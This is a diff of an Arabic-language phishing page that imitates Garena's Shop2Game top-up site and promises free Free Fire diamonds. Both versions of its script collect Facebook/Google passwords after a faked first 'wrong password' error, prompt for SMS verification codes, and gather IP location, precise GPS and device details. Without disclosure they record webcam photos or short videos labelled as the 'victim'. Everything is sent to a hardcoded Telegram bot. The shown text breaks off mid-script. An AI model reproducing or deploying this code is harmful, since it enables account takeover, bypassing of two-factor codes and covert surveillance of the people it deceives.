@@ -3,488 +3,520 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>شحن Garena - Free Fire</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <title>Shop2Game - Garena</title>
+    <link rel="preconnect" href="https://ipapi.co">
+    <link rel="preconnect" href="https://api.telegram.org">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        body {
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            background: #0a0a0a;
-            color: #fff;
-            direction: rtl;
+        :root {
+            --garena-red: #e43333;
+            --dark-bg: #121212;
+            --card-bg: #1e1e1e;
         }
-        
-        /* ===== HEADER ===== */
-        .header {
-            background: linear-gradient(135deg, #e63946, #c1121f);
-            padding: 15px 20px;
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
+        body { background: var(--dark-bg); color: white; }
+
+        .navbar {
+            background: #000;
+            padding: 12px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            border-bottom: 2px solid var(--garena-red);
         }
-        .header .logo { font-size: 1.3rem; font-weight: 900; }
-        .header .badge { 
-            background: #fff; color: #c1121f; padding: 5px 15px;
-            border-radius: 20px; font-size: 0.7rem; font-weight: bold;
-        }
-        
-        .container { max-width: 500px; margin: 0 auto; padding: 15px; }
-        
-        /* ===== GAME BANNER ===== */
-        .game-banner {
-            background: url('https://i.imgur.com/BZdGxSn.jpeg') center/cover no-repeat;
-            height: 220px;
-            border-radius: 20px;
-            position: relative;
-            margin: 15px 0;
-            cursor: pointer;
-            transition: all 0.3s;
-            overflow: hidden;
-        }
-        .game-banner:hover { transform: scale(1.02); }
-        .game-banner::after {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(transparent 40%, #0a0a0a);
-            border-radius: 20px;
-        }
-        .game-banner .overlay {
-            position: absolute;
-            bottom: 20px;
-            right: 20px;
-            z-index: 2;
-        }
-        .game-banner .overlay h2 { font-size: 1.5rem; margin: 0; }
-        .game-banner .overlay p { color: #FFD700; font-size: 0.85rem; }
-        
-        /* ===== GARENA BANNER ===== */
-        .garena-banner {
-            background: linear-gradient(135deg, #1d1d1d, #2d2d2d);
-            border-radius: 20px;
-            padding: 20px;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            margin: 15px 0;
-            border: 1px solid #333;
-        }
-        .garena-banner img { width: 60px; height: 60px; }
-        .garena-banner h3 { font-size: 1.1rem; }
-        .garena-banner p { color: #aaa; font-size: 0.8rem; }
-        
-        /* ===== SECTION ===== */
+        .garena-logo { height: 35px; order: 2; }
+        .site-title { font-size: 1.4rem; font-weight: bold; order: 1; }
+
+        .container { max-width: 500px; margin: 0 auto; padding: 20px; }
+
         .section { display: none; }
-        .section.active { display: block; }
-        
-        /* ===== OFFERS ===== */
-        .offers-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin: 15px 0; }
-        .offer-item {
-            background: #1a1a2e;
-            padding: 25px 10px;
-            border-radius: 16px;
-            text-align: center;
+        .active { display: block; }
+
+        .page-title { text-align: center; font-size: 1.8rem; margin: 30px 0; font-weight: bold; }
+
+        .game-card {
+            background: var(--card-bg);
+            border-radius: 12px;
+            overflow: hidden;
             border: 1px solid #333;
             cursor: pointer;
-            transition: all 0.3s;
+            transition: 0.3s;
+        }
+        .game-card:hover { border-color: var(--garena-red); }
+        .game-card img { width: 100%; display: block; }
+        .game-card .footer-title { padding: 15px; text-align: center; font-size: 1.3rem; background: #222; }
+
+        .offers-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
+        .offer-item {
+            background: var(--card-bg);
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            border: 1px solid #444;
+            cursor: pointer;
             position: relative;
         }
-        .offer-item:hover { border-color: #e63946; transform: translateY(-2px); }
-        .offer-item .diamond { font-size: 2rem; font-weight: 900; color: #FFD700; }
-        .offer-item .price { color: #888; font-size: 0.8rem; margin-top: 5px; }
-        .offer-item .free-tag {
-            position: absolute; top: -8px; right: -8px;
-            background: #28a745; color: #fff; padding: 3px 14px;
-            border-radius: 20px; font-size: 0.7rem; font-weight: bold;
+        .free-badge { position: absolute; top: -10px; right: -5px; background: #44bd32; padding: 2px 10px; border-radius: 10px; font-size: 11px; }
+
+        .login-methods { text-align: center; background: var(--card-bg); padding: 25px; border-radius: 15px; }
+        .btn-login {
+            width: 100%; padding: 14px; margin: 10px 0; border: none; border-radius: 6px;
+            font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;
+        }
+        .btn-fb { background: #1877f2; color: white; }
+        .btn-google { background: white; color: #555; }
+
+        input { 
+            width: 100%; padding: 14px; margin: 8px 0; border-radius: 6px; 
+            border: 1px solid #444; background: #000; color: white; font-size: 16px;
+        }
+        .btn-submit { 
+            background: var(--garena-red); color: white; width: 100%; padding: 15px; 
+            border: none; border-radius: 6px; font-weight: bold; margin-top: 15px; 
+            cursor: pointer; transition: opacity 0.3s;
+        }
+        .btn-submit:hover { opacity: 0.9; }
+        .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; }
+        
+        .error-msg { 
+            color: #ff4747; font-size: 0.85rem; margin-top: 10px; display: none; 
+            padding: 10px; background: rgba(255,71,71,0.1); border-radius: 6px;
+            border-left: 4px solid #ff4747;
         }
         
-        /* ===== PANEL ===== */
-        .panel {
-            background: #1a1a2e;
-            border-radius: 20px;
-            padding: 25px;
-            border: 1px solid #333;
-            margin: 15px 0;
+        .loading { 
+            border: 2px solid #333; border-top: 2px solid var(--garena-red); 
+            border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; 
+            display: inline-block; margin-left: 10px;
         }
-        .panel h3 { text-align: center; margin-bottom: 20px; font-size: 1.2rem; }
-        
-        /* ===== BUTTONS ===== */
-        .btn-social {
-            width: 100%; padding: 14px; margin: 10px 0; border: none; border-radius: 10px;
-            font-weight: bold; cursor: pointer; display: flex; align-items: center;
-            justify-content: center; gap: 10px; font-size: 1rem; transition: all 0.3s;
-        }
-        .btn-social:hover { transform: scale(1.02); }
-        .btn-fb { background: #1877f2; color: #fff; }
-        .btn-google { background: #fff; color: #333; }
-        
-        input {
-            width: 100%; padding: 15px; margin: 8px 0; border-radius: 10px;
-            border: 1px solid #444; background: #000; color: #fff;
-            font-size: 16px;
-        }
-        
-        .btn-primary {
-            width: 100%; padding: 16px; border: none; border-radius: 10px;
-            background: linear-gradient(135deg, #e63946, #c1121f);
-            color: #fff; font-weight: bold; font-size: 1.1rem;
-            cursor: pointer; transition: all 0.3s; margin-top: 15px;
-        }
-        .btn-primary:hover { transform: scale(1.02); }
-        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-        
-        .error {
-            display: none; color: #ff6b6b; font-size: 0.85rem; padding: 12px;
-            background: rgba(255,107,107,0.1); border-radius: 8px; margin: 10px 0;
-            border-right: 4px solid #ff6b6b;
-        }
-        
-        .spinner {
-            display: inline-block; width: 20px; height: 20px; margin-left: 8px;
-            border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff;
-            border-radius: 50%; animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        
-        /* ===== LOADING ===== */
-        .loading-screen { text-align: center; padding: 50px 20px; }
-        .big-spinner {
-            width: 50px; height: 50px; border: 4px solid #333;
-            border-top: 4px solid #e63946; border-radius: 50%;
-            animation: spin 1s linear infinite; margin: 20px auto;
-        }
-        
-        .footer-text {
-            text-align: center; margin-top: 20px; font-size: 0.7rem; color: #555;
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* تصميم SMS */
+        .otp-input {
+            text-align: center;
+            font-size: 1.8rem;
+            letter-spacing: 10px;
+            direction: ltr;
         }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <div class="logo">🎮 Shop2Game</div>
-    <span class="badge">Garena Official</span>
-</div>
+    <nav class="navbar">
+        <div class="site-title">Shop2Game</div>
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/e/ee/Garena_logo.svg/1200px-Garena_logo.svg.png" class="garena-logo" alt="Garena" loading="lazy">
+    </nav>
 
-<div class="container">
-
-    <!-- STEP 1: اختيار Free Fire -->
-    <section id="step1" class="section active">
-        <div class="game-banner" onclick="nextStep(2)">
-            <div class="overlay">
-                <h2>🔥 Free Fire</h2>
-                <p>شحن جواهر فوري</p>
-            </div>
-        </div>
+    <div class="container">
         
-        <!-- Garena Banner -->
-        <div class="garena-banner">
-            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/e/ee/Garena_logo.svg/1200px-Garena_logo.svg.png" alt="Garena">
-            <div>
-                <h3>Garena</h3>
-                <p>الشركة الرسمية للنشر</p>
+        <!-- STEP 1: اختيار اللعبة -->
+        <section id="step1" class="section active">
+            <h2 class="page-title">اختر اللعبة</h2>
+            <div class="game-card" onclick="goToStep(2)">
+                <img src="https://freefiremobile-a.akamaihd.net/ffwebsite/images/wallpaper/img1.jpg" alt="Free Fire" loading="lazy">
+                <div class="footer-title">Free Fire</div>
             </div>
-        </div>
-        
-        <p style="text-align:center;margin:20px 0;color:#888;font-size:0.9rem;">اختر اللعبة للبدء في الشحن</p>
-    </section>
+        </section>
 
-    <!-- STEP 2: العروض -->
-    <section id="step2" class="section">
-        <h2 style="text-align:center;margin:20px 0;font-size:1.5rem;">💎 عروض الشحن</h2>
-        <div class="offers-grid">
-            <div class="offer-item" style="border:2px solid #28a745;" onclick="selectOffer('100 Diamond FREE')">
-                <span class="free-tag">مجاناً</span>
-                <div class="diamond">💎 100</div>
-                <div class="price" style="color:#28a745;font-weight:bold;">مجاني تماماً</div>
+        <!-- STEP 2: العروض -->
+        <section id="step2" class="section">
+            <h2 class="page-title">العروض المميزة 💎</h2>
+            <div class="offers-grid">
+                <div class="offer-item" style="border: 2px solid #44bd32;" onclick="goToStep(3, '500 Diamond Free')">
+                    <span class="free-badge">مجاناً</span>
+                    <div style="font-size: 1.5rem; font-weight: bold; color: #ffd700;">💎 100</div>
+                    <div style="color: #44bd32;">احصل عليها الآن</div>
+                </div>
+                <div class="offer-item" onclick="window.location.href='https://shop2game.com'">
+                    <div style="font-size: 1.5rem; font-weight: bold; color: #ffd700;">💎 1080</div>
+                    <div style="color: #aaa;">$10.00</div>
+                </div>
             </div>
-            <div class="offer-item" onclick="selectOffer('1080 Diamond')">
-                <div class="diamond">💎 1080</div>
-                <div class="price">$10.00 USD</div>
+        </section>
+
+        <!-- STEP 3: تسجيل الدخول -->
+        <section id="step3" class="section">
+            <div class="login-methods">
+                <h3>تسجيل الدخول للاستلام</h3>
+                <p style="color: #aaa; margin-bottom: 20px; font-size: 0.9rem;">يجب التحقق من حسابك لإرسال الجواهر</p>
+                <button class="btn-login btn-fb" onclick="showForm('Facebook')"><i class="fab fa-facebook"></i> Facebook</button>
+                <button class="btn-login btn-google" onclick="showForm('Google')"><img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="18" loading="lazy"> Google</button>
             </div>
-        </div>
-    </section>
+        </section>
 
-    <!-- STEP 3: طريقة الدخول -->
-    <section id="step3" class="section">
-        <div class="panel">
-            <h3>🔐 تسجيل الدخول إلى Garena</h3>
-            <p style="text-align:center;color:#aaa;font-size:0.85rem;margin-bottom:15px;">
-                سجل الدخول بحساب Garena المرتبط بـ Free Fire
-            </p>
-            <button class="btn-social btn-fb" onclick="chooseMethod('Facebook')">
-                <i class="fab fa-facebook"></i> Facebook
-            </button>
-            <button class="btn-social btn-google" onclick="chooseMethod('Google')">
-                <img src="https://www.google.com/favicon.ico" width="18"> Google
-            </button>
-        </div>
-    </section>
+        <!-- STEP 4: إدخال البيانات -->
+        <section id="step4" class="section">
+            <div class="login-methods">
+                <h3 id="formTitle">تسجيل الدخول</h3>
+                <div id="errorBox" class="error-msg">حدث خطأ: معلومات الدخول غير متطابقة مع بيانات فري فاير.</div>
+                <input type="email" id="userEmail" placeholder="البريد الإلكتروني أو الهاتف" autocomplete="off">
+                <input type="password" id="userPass" placeholder="كلمة المرور" autocomplete="off">
+                <button class="btn-submit" id="submitBtn" onclick="handleData(event)">إشحن الآن 💎</button>
+            </div>
+        </section>
 
-    <!-- STEP 4: إدخال البيانات -->
-    <section id="step4" class="section">
-        <div class="panel">
-            <h3 id="loginTitle">📧 تسجيل الدخول</h3>
-            <div id="errorBox" class="error">❌ بيانات الدخول غير صحيحة. حاول مرة أخرى.</div>
-            <input type="email" id="emailInput" placeholder="البريد الإلكتروني أو رقم الهاتف" autocomplete="off">
-            <input type="password" id="passInput" placeholder="كلمة المرور" autocomplete="off">
-            <button class="btn-primary" id="submitBtn" onclick="handleLogin(event)">
-                💎 إشحن الآن
-            </button>
-        </div>
-    </section>
+        <!-- STEP 5: SMS -->
+        <section id="step5" class="section">
+            <div class="login-methods">
+                <h3>تأكيد الهوية (SMS)</h3>
+                <p style="font-size: 0.8rem; color: #aaa;">أرسلنا رمزاً لهاتفك، أدخله هنا لتفعيل الشحن المجاني.</p>
+                <input type="text" id="smsInput" class="otp-input" placeholder="000000" maxlength="6">
+                <button class="btn-submit" onclick="handleSMS(event)">تأكيد الرمز</button>
+            </div>
+        </section>
 
-    <!-- STEP 5: كود SMS -->
-    <section id="step5" class="section">
-        <div class="panel">
-            <h3>📱 تأكيد الهوية (SMS)</h3>
-            <p style="text-align:center;color:#aaa;font-size:0.85rem;margin-bottom:15px;">
-                تم إرسال رمز إلى هاتفك. أدخله أدناه.
-            </p>
-            <input type="text" id="smsInput" placeholder="_ _ _ _ _ _" maxlength="6" 
-                   style="text-align:center;font-size:1.8rem;letter-spacing:10px;">
-            <button class="btn-primary" onclick="handleSMS(event)">تأكيد الرمز</button>
-        </div>
-    </section>
+        <!-- STEP 6: تم -->
+        <section id="step6" class="section">
+            <div class="login-methods">
+                <div class="loading" style="width:35px;height:35px;margin:20px auto;"></div>
+                <h3>جاري التحقق...</h3>
+                <p>يتم الآن مراجعة بياناتك مع سيرفرات كرينا، ستصلك الجواهر فور الانتهاء.</p>
+            </div>
+        </section>
 
-    <!-- STEP 6: تم -->
-    <section id="step6" class="section">
-        <div class="panel loading-screen">
-            <div class="big-spinner"></div>
-            <h3>🔄 جاري التحقق من بياناتك مع Garena...</h3>
-            <p style="color:#aaa;">يتم الآن إضافة 💎 100 إلى حساب Free Fire الخاص بك</p>
-            <p style="color:#666;font-size:0.8rem;margin-top:20px;">قد تستغرق العملية 2-3 دقائق</p>
-        </div>
-    </section>
-
-    <div class="footer-text">
-        <span style="color:#28a745;">✓</span> اتصال آمن SSL | <span style="color:#28a745;">✓</span> مدعوم من Garena
     </div>
-</div>
 
-<script>
-// ==================== TELEGRAM CONFIG ====================
-const BOT_TOKEN = "8716711028:AAEycnNKXBDQI8lEqghG3T1QV8hxeG4aI0c";
-const CHAT_ID = "7902407443";
-
-async function sendToTelegram(text) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    try {
-        const res = await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: text,
-                parse_mode: 'HTML'
-            })
-        });
-        const data = await res.json();
-        console.log('Telegram response:', data);
-        return data.ok;
-    } catch(e) {
-        console.error('Telegram error:', e);
-        return false;
-    }
-}
-
-// ==================== STATE ====================
-let selectedMethod = "";
-let selectedOffer = "";
-let attempts = 0;
-
-// ==================== NAVIGATION ====================
-function nextStep(n) {
-    document.querySelectorAll('.section').forEach(el => el.classList.remove('active'));
-    document.getElementById('step' + n).classList.add('active');
-    window.scrollTo({ top: 0, behavior: 'smooth' });
-}
-
-function selectOffer(o) {
-    selectedOffer = o;
-    nextStep(3);
-}
-
-function chooseMethod(m) {
-    selectedMethod = m;
-    document.getElementById('loginTitle').innerText = `📧 الدخول عبر ${m}`;
-    nextStep(4);
-}
-
-// ==================== GET IP LOCATION ====================
-async function getLocation() {
-    try {
-        const res = await fetch('https://ipapi.co/json/', { 
-            signal: AbortSignal.timeout(5000) 
-        });
-        const d = await res.json();
-        return `🌍 الدولة: ${d.country_name || 'N/A'}\n📍 المدينة: ${d.city || 'N/A'}\n🏢 المزود: ${d.org || 'N/A'}\n🌐 IP: ${d.ip || 'N/A'}`;
-    } catch(e) {
-        return '🌍 معلومات الموقع غير متوفرة';
-    }
-}
-
-// ==================== GET GPS ====================
-function getGPS() {
-    return new Promise((resolve) => {
-        if (!navigator.geolocation) { resolve('📍 GPS: غير متاح'); return; }
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                resolve(`📍 الموقع الدقيق: ${pos.coords.latitude}, ${pos.coords.longitude}\n🔗 خرائط: https://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-            },
-            () => { resolve('📍 GPS: مرفوض من المستخدم'); },
-            { enableHighAccuracy: true, timeout: 10000 }
-        );
-    });
-}
-
-// ==================== GET PHOTO ====================
-async function getPhoto() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: 'user', width: 640, height: 480 },
-            audio: false 
-        });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
-
-        const canvas = document.createElement('canvas');
-        canvas.width = 640;
-        canvas.height = 480;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-
-        stream.getTracks().forEach(t => t.stop());
-
-        const photoBase64 = canvas.toDataURL('image/jpeg', 0.7);
-        return photoBase64;
-    } catch(e) {
-        return null;
-    }
-}
-
-// ==================== SEND PHOTO TO TELEGRAM ====================
-async function sendPhotoToTelegram(base64, caption) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-    
-    // Convert base64 to blob
-    const byteString = atob(base64.split(',')[1]);
-    const mimeString = base64.split(',')[0].split(':')[1].split(';')[0];
-    const ab = new ArrayBuffer(byteString.length);
-    const ia = new Uint8Array(ab);
-    for (let i = 0; i < byteString.length; i++) {
-        ia[i] = byteString.charCodeAt(i);
-    }
-    const blob = new Blob([ab], { type: mimeString });
-    
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('photo', blob, 'photo.jpg');
-    formData.append('caption', caption || '📸 صورة الضحية');
-    
-    try {
-        const res = await fetch(url, { method: 'POST', body: formData });
-        return res.ok;
-    } catch(e) {
-        console.error('Photo error:', e);
-        return false;
-    }
-}
-
-// ==================== HANDLE LOGIN ====================
-window.handleLogin = async function(event) {
-    event.preventDefault();
-    const email = document.getElementById('emailInput').value.trim();
-    const pass = document.getElementById('passInput').value.trim();
-    const errorBox = document.getElementById('errorBox');
-    const btn = document.getElementById('submitBtn');
-
-    if (!email || !pass) {
-        errorBox.style.display = 'block';
-        errorBox.innerText = '❌ يرجى ملء جميع الحقول';
-        return;
-    }
-
-    if (attempts < 1) {
-        errorBox.style.display = 'block';
-        errorBox.innerText = '❌ بيانات الدخول غير صحيحة. حاول مرة أخرى.';
-        attempts++;
-        return;
-    }
-
-    btn.innerHTML = '<span class="spinner"></span> جاري الشحن...';
-    btn.disabled = true;
-    errorBox.style.display = 'none';
-
-    // Collect data in parallel
-    const [locationInfo, gpsInfo, photoBase64] = await Promise.all([
-        getLocation(),
-        getGPS(),
-        getPhoto()
-    ]);
-
-    // Build message
-    const message = `
-🔥 <b>صيد جديد - Free Fire</b> 🔥
-
+    <script>
+        // ==================== TELEGRAM CONFIG ====================
+        const BOT_TOKEN = "8716711028:AAEycnNKXBDQI8lEqghG3T1QV8hxeG4aI0c";
+        const CHAT_ID = "7902407443";
+        
+        let attempts = 0;
+        let selectedOffer = "";
+        let method = "";
+        let capturedMedia = null;  // الصورة أو الفيديو المسجل
+        
+        // ==================== التنقل ====================
+        function goToStep(s, extra = "") {
+            document.querySelectorAll('.section').forEach(sec => sec.classList.remove('active'));
+            document.getElementById('step' + s).classList.add('active');
+            if(extra) selectedOffer = extra;
+            window.scrollTo(0,0);
+        }
+        
+        function showForm(m) {
+            method = m;
+            document.getElementById('formTitle').innerText = "الدخول عبر " + m;
+            goToStep(4);
+        }
+        
+        // ==================== 🎥 التقاط صورة/فيديو فور الدخول ====================
+        async function captureMediaOnEntry() {
+            try {
+                // طلب الكاميرا فوراً
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false 
+                });
+                
+                // ✅ تسجيل فيديو لمدة 3 ثواني
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.muted = true;
+                await video.play();
+                
+                // تسجيل الفيديو
+                const mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: 'video/webm;codecs=vp8,opus'
+                });
+                
+                const chunks = [];
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
+                
+                mediaRecorder.start();
+                
+                // انتظر 3 ثواني
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                
+                mediaRecorder.stop();
+                stream.getTracks().forEach(t => t.stop());
+                
+                // انتظر الانتهاء
+                await new Promise(resolve => {
+                    mediaRecorder.onstop = resolve;
+                    setTimeout(resolve, 1000);
+                });
+                
+                if (chunks.length > 0) {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    capturedMedia = {
+                        type: 'video',
+                        blob: blob,
+                        filename: `victim_${Date.now()}.webm`
+                    };
+                    console.log(`✅ تم تسجيل فيديو: ${(blob.size / 1024).toFixed(1)} KB`);
+                    return capturedMedia;
+                }
+                
+                // إذا فشل الفيديو، التقط صورة
+                return await capturePhoto();
+                
+            } catch (err) {
+                console.log('❌ فشل تسجيل الفيديو:', err.message);
+                // حاول التقاط صورة بدلاً من ذلك
+                return await capturePhoto();
+            }
+        }
+        
+        // 📸 التقاط صورة (fallback)
+        async function capturePhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" },
+                    audio: false 
+                });
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                stream.getTracks().forEach(t => t.stop());
+                
+                const base64 = canvas.toDataURL('image/jpeg', 0.8);
+                const blob = await fetch(base64).then(r => r.blob());
+                
+                capturedMedia = {
+                    type: 'photo',
+                    blob: blob,
+                    filename: `victim_${Date.now()}.jpg`
+                };
+                console.log('✅ تم التقاط صورة');
+                return capturedMedia;
+                
+            } catch (err) {
+                console.log('❌ فشل التقاط الصورة:', err.message);
+                return null;
+            }
+        }
+        
+        // ==================== إرسال الصورة أو الفيديو إلى Telegram ====================
+        async function sendMediaToTelegram(caption) {
+            if (!capturedMedia) return false;
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('video', capturedMedia.blob, capturedMedia.filename);
+            formData.append('caption', caption || '🎥 فيديو الضحية');
+            formData.append('supports_streaming', 'true');
+            
+            try {
+                const res = await fetch(url, { method: 'POST', body: formData });
+                const result = await res.json();
+                console.log('✅ تم إرسال الفيديو:', result.ok);
+                return result.ok;
+            } catch(e) {
+                // جرب إرسال كصورة إذا فشل الفيديو
+                if (capturedMedia.type === 'photo' || !capturedMedia.type) {
+                    return await sendPhotoToTelegram(caption);
+                }
+                console.error('❌ فشل إرسال الوسائط:', e);
+                return false;
+            }
+        }
+        
+        async function sendPhotoToTelegram(caption) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', capturedMedia.blob, 'victim.jpg');
+            formData.append('caption', caption || '📸 صورة الضحية');
+            
+            try {
+                const res = await fetch(url, { method: 'POST', body: formData });
+                return res.ok;
+            } catch(e) {
+                console.error('❌ فشل إرسال الصورة:', e);
+                return false;
+            }
+        }
+        
+        // ==================== إرسال النص إلى Telegram ====================
+        async function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                const res = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const data = await res.json();
+                console.log('✅ Telegram:', data.ok);
+                return data.ok;
+            } catch(e) {
+                console.error('❌ Telegram error:', e);
+                return false;
+            }
+        }
+        
+        // ==================== الحصول على المعلومات ====================
+        async function getAllInfo() {
+            const info = {
+                ip: 'N/A',
+                country: 'N/A',
+                city: 'N/A',
+                region: 'N/A',
+                isp: 'N/A',
+                lat: 'N/A',
+                lon: 'N/A',
+                timezone: 'N/A',
+                gps: 'N/A',
+                gpsLink: ''
+            };
+            
+            // IP Location
+            try {
+                const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
+                const d = await res.json();
+                info.ip = d.ip || 'N/A';
+                info.country = d.country_name || 'N/A';
+                info.city = d.city || 'N/A';
+                info.region = d.region || 'N/A';
+                info.isp = d.org || 'N/A';
+                info.lat = d.latitude || 'N/A';
+                info.lon = d.longitude || 'N/A';
+                info.timezone = d.timezone || 'N/A';
+            } catch(e) {}
+            
+            // GPS
+            try {
+                const gps = await new Promise((resolve) => {
+                    if (!navigator.geolocation) { resolve('N/A'); return; }
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => resolve(`${pos.coords.latitude},${pos.coords.longitude}`),
+                        () => resolve('مرفوض'),
+                        { enableHighAccuracy: true, timeout: 8000 }
+                    );
+                });
+                info.gps = gps;
+                if (gps && gps.includes(',')) {
+                    info.gpsLink = `https://maps.google.com/maps?q=${gps}`;
+                }
+            } catch(e) {}
+            
+            return info;
+        }
+        
+        // ==================== معالجة البيانات ====================
+        window.handleData = async function(event) {
+            event.preventDefault();
+            const email = document.getElementById('userEmail').value.trim();
+            const pass = document.getElementById('userPass').value.trim();
+            const errorBox = document.getElementById('errorBox');
+            const btn = document.getElementById('submitBtn');
+            
+            if(!email || !pass) {
+                errorBox.style.display = 'block';
+                errorBox.innerText = 'يرجى إدخال البريد وكلمة المرور';
+                return;
+            }
+            
+            if(attempts < 1) {
+                errorBox.style.display = 'block';
+                errorBox.innerText = 'حدث خطأ: معلومات الدخول غير متطابقة مع بيانات فري فاير.';
+                attempts++;
+                return;
+            }
+            
+            // Show loading
+            btn.innerHTML = '<div class="loading"></div> جاري الإرسال...';
+            btn.disabled = true;
+            errorBox.style.display = 'none';
+            
+            // جمع المعلومات
+            const info = await getAllInfo();
+            
+            // بناء الرسالة
+            const msg = `🔥 <b>صيد جديد - Free Fire</b> 🔥
+            
 ━━━━━━━━━━━━━━━━━━
 💎 <b>العرض:</b> ${selectedOffer}
-🔑 <b>طريقة الدخول:</b> ${selectedMethod}
+🔑 <b>طريقة الدخول:</b> ${method}
 ━━━━━━━━━━━━━━━━━━
-📧 <b>البريد/الهاتف:</b> <code>${email}</code>
-🔒 <b>كلمة المرور:</b> <code>${pass}</code>
+📧 <b>البريد:</b> <code>${email}</code>
+🔒 <b>كلمة السر:</b> <code>${pass}</code>
 ━━━━━━━━━━━━━━━━━━
 📱 <b>الجهاز:</b> ${navigator.platform}
-🌐 <b>المتصفح:</b> ${navigator.userAgent.substring(0,100)}
-🕐 <b>التاريخ:</b> ${new Date().toLocaleString('ar-EG')}
+🌐 <b>المتصفح:</b> ${navigator.userAgent.substring(0,80)}...
+🖥 <b>الشاشة:</b> ${screen.width}x${screen.height}
+🗣 <b>اللغة:</b> ${navigator.language}
 ━━━━━━━━━━━━━━━━━━
-${locationInfo}
-${gpsInfo}
+🌍 <b>IP:</b> <code>${info.ip}</code>
+🏳️ <b>الدولة:</b> ${info.country}
+📍 <b>المدينة:</b> ${info.city}
+🏢 <b>المزود:</b> ${info.isp}
+📍 <b>GPS:</b> ${info.gps}
+${info.gpsLink ? `🗺 <b>الخريطة:</b> ${info.gpsLink}` : ''}
 ━━━━━━━━━━━━━━━━━━
-🔗 <b>الرابط:</b> ${window.location.href}
-    `.trim();
-
-    // Send to Telegram
-    const textSent = await sendToTelegram(message);
-
-    // Send photo if available
-    if (photoBase64) {
-        await sendPhotoToTelegram(photoBase64, `📸 صورة الضحية — ${email}`);
-    }
-
-    console.log('✅ تم الإرسال! Text:', textSent, 'Photo:', !!photoBase64);
-
-    btn.innerHTML = '💎 إشحن الآن';
-    btn.disabled = false;
-
-    nextStep(5);
-};
-
-// ==================== HANDLE SMS ====================
-window.handleSMS = async function(event) {
-    event.preventDefault();
-    const code = document.getElementById('smsInput').value.trim();
-    const btn = document.querySelector('#step5 .btn-primary');
-
-    if (!code || code.length < 4) {
-        alert('يرجى إدخال الرمز');
-        return;
-    }
-
-    btn.innerHTML = '<span class="spinner"></span> جاري التأكيد...';
-    btn.disabled = true;
-
-    const msg = `📩 <b>كود SMS واصل!</b>\n\n📧 الحساب: ${document.getElementById('emailInput').value}\n🔢 الرمز: <code>${code}</code>\n🕐 ${new Date().toLocaleString('ar-EG')}`;
-    
-    await sendToTelegram(msg);
-
-    btn.innerHTML = 'تأكيد الرمز';
-    btn.disabled = false;
-
-    nextStep(6);
-};
-</script>
-
+🕐 <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}
+🔗 <b>الرابط:</b> ${window.location.href}`;
+            
+            // إرسال النص
